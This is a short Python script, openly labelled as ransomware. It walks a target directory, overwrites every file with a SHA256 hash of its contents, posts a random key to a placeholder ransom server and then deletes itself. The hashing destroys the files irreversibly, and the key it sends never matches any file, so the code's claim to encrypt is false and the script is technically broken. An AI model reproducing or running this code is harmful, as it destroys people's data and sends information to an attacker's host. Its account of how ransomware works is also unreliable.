import os
import random
import string
import hashlib
import requests

# Generate a random key
def generate_key():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))

# Encrypt files using SHA256
def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        content = file.read()
    encrypted_content = hashlib.sha256(content + key.encode()).hexdigest()
    with open(file_path, 'wb') as file:
        file.write(encrypted_content.encode())

# Send the key to a server
def send_key_to_server(key):
    server_url = 'https://your-ransom-server.com'
    requests.post(server_url, data={'key': key})

# Delete the ransomware program
def delete_ransomware():
    os.remove(__file__)

# Main execution
if __name__ == '__main__':
    # Encrypt files in a target directory
    target_directory = '/path/to/target/directory'
    for root, dirs, files in os.walk(target_directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, generate_key())
    
    # Send the randomly generated key to a server
    key = generate_key()
    send_key_to_server(key)
    
    # Delete the ransomware program itself
    delete_ransomware()
